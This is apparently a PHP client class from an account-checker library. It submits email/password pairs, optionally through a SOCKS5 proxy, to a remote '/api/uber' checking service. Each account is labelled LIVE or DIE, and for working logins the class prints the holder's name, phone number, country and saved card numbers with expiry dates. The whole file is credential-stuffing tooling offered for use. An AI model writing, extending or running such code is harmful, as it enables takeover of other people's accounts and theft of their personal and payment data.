<?php
/*
* Product   : Aloresal Library for PHP
* Author    : -
*             -
*             -
* Web       : aloresal.com
* Revision  : 1.0.0
*
*/

namespace Aloresal\Api;

use Aloresal\Aloresal;
use Aloresal\Helper;

class Uber extends Aloresal
{

    public function __construct($apikey)
    {
        parent::__construct($apikey);
        $this->apikey = $apikey;
    }

    /*
     * The main method for this class
     * Check the Uber account and grab its data
     */
    public function exec()
    {
        $params = '&email='. $this->email .
                  '&password=' . $this->password .
                  ((isset($this->socks5)) ? '&socks5='.$this->socks5 : '');
        $result = Helper::pipe($this->protocol . '://'.$this->server.'/api/uber?api=' . $this->apikey . $params);
        $result = json_decode($result, true);

        if($this->returnType === 0)
        {
            $this->output = json_encode($result);
        }
        else if($this->returnType === 1)
        {
            $print = array();

            switch ($result['code']) {
                case 0:
                    $print['code'] = 0;
                    break;
                case 1:
                    $print['code'] = 400;
                    break;
                default:
                    $print['code'] = 1;
                    break;
            }

            $print['msg'] = ($result['code'] === 0 ?
                                        Helper::color('<b>LIVE</b>', '@Green') :
                                        ($result['code'] == 2 ?
                                            Helper::color('<b>DIE</b>', '@Red') :
                                            ($result['code'] == 3 ?
                                                Helper::color('<b>FAILED</b>', '@Red') :
                                                ($result['code'] == 4 ?
                                                    Helper::color('<b>NOT SUPPORT</b>', '@Yellow') :
                                                    ($result['code'] == 5 ?
                                                        Helper::color('<b>Unk</b>', '@Blue') :
                                                        ''))))).' | ';


            $print['msg'] .=
                            (empty($this->socks5) ? '' : Helper::color($this->socks5.' | ', '@Black')) .
                            (isset($this->email) == true ? Helper::color($this->email, '@Black').' | ' : '') .
                            (isset($this->password) == true && $this->password != '' ? Helper::color($this->password, '@Black').' | ' : '');

            if ($result['code'] === 0) {

                $print['msg'] .=
                    (isset($result['data']['name']) == true ? Helper::color('name : '.$result['data']['name'], '@Black').' | ' : '').
                    (isset($result['data']['mobile']) == true ? Helper::color('mobile : '.$result['data']['mobile'], '@Black').' | ' : '').
                    (isset($result['data']['country']) == true ? Helper::color('country : '.$result['data']['country'], '@Black').' | ' : '');

                if ($result['data']['cards']) {
                    foreach ($result['data']['cards'] as $card) {
                        $print['msg'] .=
                                (isset($card['card_type']) == true ? Helper::color($card['card_type'], '@Tomato').' - ' : '').
                                (isset($card['card_number']) == true ? Helper::color($card['card_number'], '@Tomato').' - ' : '').
                                (isset($card['exp']) == true ? Helper::color($card['exp'], '@Tomato').' | ' : '');
                    }
                }

            }

            if (!empty($result['msg'])) {
                $print['msg'] .= Helper::color('message: '.$result['msg'], '@Black').' | ';
            }

            if ($result['code'] === 0) {
                $print['msg'] .= Helper::color('[API: '.$result['data']['API'].'] '.'[Server: '.$result['account']['API_Server'].']', '@Gray');
            }

            $this->output = $print;

        }

    }

}
